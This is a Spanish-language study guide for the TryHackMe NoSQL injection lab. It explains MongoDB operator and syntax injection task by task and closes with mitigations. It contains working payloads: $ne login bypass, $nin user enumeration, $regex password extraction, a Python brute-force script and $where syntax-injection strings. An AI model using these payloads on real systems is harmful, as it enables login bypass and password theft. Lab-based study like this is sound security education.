# Sesión 006 — NoSQL Injection (TryHackMe)

> Modo profesor: material exacto primero, ejecución después.
> Room: `nosqlinjectiontutorial` — cuenta FREE de TryHackMe.
> Objetivo: entender inyección en bases NoSQL, principalmente MongoDB.

## Situación actual

- Bloque 04 Web en curso.
- Completados: Enumeration & Brute Force, CSRF, XSS, Advanced SQL Injection.
- Siguiente room del path gratuito: NoSQL Injection.

## Objetivo del bloque

Aprender cómo se inyecta en bases de datos NoSQL (MongoDB), entendiendo la
diferencia con SQL injection y dominando Operator Injection y Syntax
Injection.

## Material previo (leer ANTES de empezar)

1. **TryHackMe NoSQL Injection room** — overview y objetivos.
2. **MongoDB Operator Reference:** https://www.mongodb.com/docs/manual/reference/operator/
   - Leer al menos `$ne`, `$nin`, `$gt`, `$lt`, `$regex`, `$where`, `$exists`.
3. **PortSwigger Web Security Academy** — NoSQL injection topic (si está
disponible; sino, la room basta).

---

## Clase por task

### Task 1 — Introducción

**Concepto:** NoSQL Injection es injection igual que SQLi. La causa raíz es la
misma: input de usuario mezclado con query.

**Ejercicio:** marcar la task como lista y empezar la máquina.

---

### Task 2 — What is NoSQL

**Conceptos a fijar:**

- **Documento:** objeto JSON-like con campos arbitrarios.
- **Colección:** grupo de documentos (equivalente a tabla).
- **Base de datos:** grupo de colecciones.
- **Query:** filtro en formato asociativo.

**Ejemplo:**

```javascript
// SQL
SELECT * FROM people WHERE last_name = 'Sandler';

// MongoDB
db.people.find({ "last_name": "Sandler" })
```

**Operadores básicos:**

| Operador | Significado |
|---|---|
| `$ne` | not equal |
| `$gt` | greater than |
| `$lt` | less than |
| `$nin` | not in array |
| `$regex` | expresión regular |

**Ejercicio:**

Respondé las tres preguntas de la task:
1. ¿Cómo se llama un grupo de documentos en MongoDB?
2. ¿Qué operador filtra cuando un campo no es igual a un valor?
3. Dado el filtro `['gender' => ['$ne' => 'female'], 'age' => ['$gt' => '65']]`,
   ¿cuántos documentos devuelve?

---

### Task 3 — NoSQL Injection

**Conceptos:**

Hay dos tipos principales:

1. **Syntax Injection:** similar a SQLi, rompés la sintaxis de la query.
2. **Operator Injection:** inyectás operadores de MongoDB para cambiar el
   comportamiento del filtro, sin romper la sintaxis.

**Por qué Operator Injection es más común:**

La mayoría de las librerías modernas sanitizan correctamente strings, pero no
siempre validan que el input sea realmente un string y no un array u objeto.

**Cómo enviar arrays en POST (PHP):**

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user[$ne]=xxxx&pass[$ne]=yyyy
```

PHP convierte esto en:

```php
$user = ['$ne' => 'xxxx'];
$pass = ['$ne' => 'yyyy'];
```

**Ejemplo de query vulnerable:**

```php
$q = new MongoDB\Driver\Query([
  'username' => $user,
  'password' => $pass
]);
```

Resultado:

```javascript
{ "username": { "$ne": "xxxx" }, "password": { "$ne": "yyyy" } }
```

Devuelve todos los documentos donde username no sea `xxxx` y password no sea
`yyyy` — es decir, todos.

**Preguntas de la task:**
1. ¿Qué tipo de NoSQLi es similar a SQLi normal?
2. ¿Qué tipo permite modificar el comportamiento de la query sin escapar la
   sintaxis?

---

### Task 4 — Operator Injection: Bypassing the Login Screen

**Ejercicio:**

1. Andá a `http://MACHINE_IP/`.
2. Interceptá el login con Burp Suite.
3. El request original es algo como:
   ```http
   POST /login HTTP/1.1
   ...
   
   user=admin&pass=admin
   ```
4. Cambiá el body a:
   ```http
   user[$ne]=xxxx&pass[$ne]=yyyy
   ```
5. Enviá el request.

**Por qué funciona:**

La query pasa a ser:

```javascript
{ "username": { "$ne": "xxxx" }, "password": { "$ne": "yyyy" } }
```

Devuelve el primer usuario de la colección. La app asume que es un login
válido.

**Pregunta de la task:**
- ¿Cuál es el email del usuario con el que se inició sesión?

**Teoría extra:**

Este bypass funciona porque el backend **no valida el tipo** de `user` y `pass`.
Espera strings, pero acepta arrays. Eso es un patrón común en aplicaciones PHP
con MongoDB.

En Node.js pasa algo similar si se usa `req.body` directamente sin validar.

---

### Task 5 — Operator Injection: Logging in as Other Users

**Concepto:** `$nin` permite excluir usuarios específicos. Si sabemos que el
primer usuario es `admin`, podemos excluirlo para loguearnos como el siguiente.

**Payload:**

```http
user[$nin][]=admin&pass[$ne]=xxxx
```

Esto devuelve cualquier usuario que no sea `admin` y cuyo password no sea
`xxxx`.

Para excluir varios:

```http
user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=xxxx
```

**Ejercicio:**

1. Logueate como diferentes usuarios excluyendo los ya conocidos.
2. Respondé:
   - ¿Cuántos usuarios hay en total?
   - ¿Cuál es el usuario que empieza con "p"?

**Teoría extra:**

Esto es una técnica de **enumeración por exclusión**. Es lenta para muchos
usuarios pero útil cuando no podés ver directamente la base de datos.

---

### Task 6 — Operator Injection: Extracting Users' Passwords

**Concepto:** `$regex` permite hacer fuerza bruta carácter por carácter,
como en Blind SQLi.

**Determinar longitud:**

```http
user=admin&pass[$regex]=^.{7}$
```

Si el login falla, el password no tiene 7 caracteres.

**Determinar primer carácter:**

```http
user=admin&pass[$regex]=^c....$
```

Si el login falla, el primer carácter no es `c`.

Si probás:

```http
user=admin&pass[$regex]=^a....$
```

Y el login es exitoso, el primer carácter es `a`.

**Ejercicio:**

1. Obtené el password del usuario `john` usando `$regex`.
2. Identificá qué usuario reutiliza su password y conectate por SSH para
   obtener la flag final.

**Teoría extra:**

Este ataque es una **fuerza bruta booleana**. Se puede automatizar con Python,
Burp Intruder o scripts simples.

Script conceptual en Python:

```python
import requests
import string

url = "http://MACHINE_IP/login"
known = ""
chars = string.ascii_letters + string.digits

while True:
    for c in chars:
        payload = f"^{known}{c}"
        r = requests.post(url, data={
            "user": "john",
            "pass[$regex]": payload
        })
        if "sekr3tPl4ce" in r.text or r.status_code == 302:
            known += c
            print(known)
            break
    else:
        break
```

(Ajustar según la respuesta real de la app.)

---

### Task 7 — Syntax Injection: Identification and Data Extraction

**Concepto:** Syntax Injection ocurre cuando el desarrollador usa `$where` o
JavaScript directamente en la query.

**Vulnerable:**

```javascript
db.users.find({ "$where": "this.username == '" + username + "'" });
```

**Detección:**

Probar con una comilla:

```text
admin'
```

Si la app devuelve un error de JavaScript/MongoDB, hay Syntax Injection.

**Confirmar con condiciones booleanas:**

```text
admin' && 0 && 'x
admin' && 1 && 'x
```

La primera debería fallar (falsa), la segunda devolver el email (verdadera).

**Explotar:**

```text
admin' || 1 || '
```

Esto hace que la condición JavaScript sea siempre verdadera, devolviendo todos
los documentos.

**Ejercicio:**

1. Conectate por SSH:
   ```bash
   ssh syntax@MACHINE_IP
   ```
   Password: `syntax`
2. Ejecutá la aplicación interactiva.
3. Probá `admin'`, luego `admin' && 0 && 'x` y `admin' && 1 && 'x`.
4. Extraé todos los emails con `admin' || 1 || '`.

**Preguntas de la task:**
1. ¿Qué carácter común se usa para probar inyección tanto en SQL como en NoSQL?
2. ¿Cuál es el email del super secret user que aparece al final?

**Teoría extra:**

`$where` y JavaScript en queries están desaconsejados en MongoDB moderno. La
forma segura es usar filtros nativos:

```javascript
db.users.find({ "username": username })
```

Esto no ejecuta JavaScript del lado del cliente y no es vulnerable a Syntax
Injection.

---

### Task 8 — Conclusión

**Conceptos de defensa:**

1. **Parameterized queries:** separar query de input.
2. **Validar tipos:** rechazar arrays u objetos cuando se espera un string.
3. **No usar `$where` con concatenación:** usar filtros nativos.
4. **Input validation:** filtrar caracteres y operadores peligrosos.
5. **Principio de mínimo privilegio.**

**Pregunta de la task:**
- Marcar como completada.

---

## Entregables públicos

1. Writeup en `labs/tryhackme/nosql-injection.md` con formato repaso:
   - concepto por técnica,
   - payload clave (sin flag),
   - por qué funcionó,
   - errores comunes,
   - mitigaciones.
2. Actualizar `plan/thm-web-path.md` con NoSQL Injection como hecha.
3. Actualizar `roadmap/progress.md` si se cierra evidencia del Bloque 04.

## Autoevaluación

1. ¿Cuál es la diferencia entre Operator Injection y Syntax Injection en
   NoSQL?
2. ¿Cómo envía PHP un array a través de un POST request?
3. ¿Por qué `user[$ne]=xxxx&pass[$ne]=yyyy` permite bypassar un login?
4. ¿Qué operador permite extraer passwords carácter por carácter?
5. ¿Por qué `$where` es peligroso si se concatena input de usuario?
6. Nombra tres mitigaciones contra NoSQL injection.
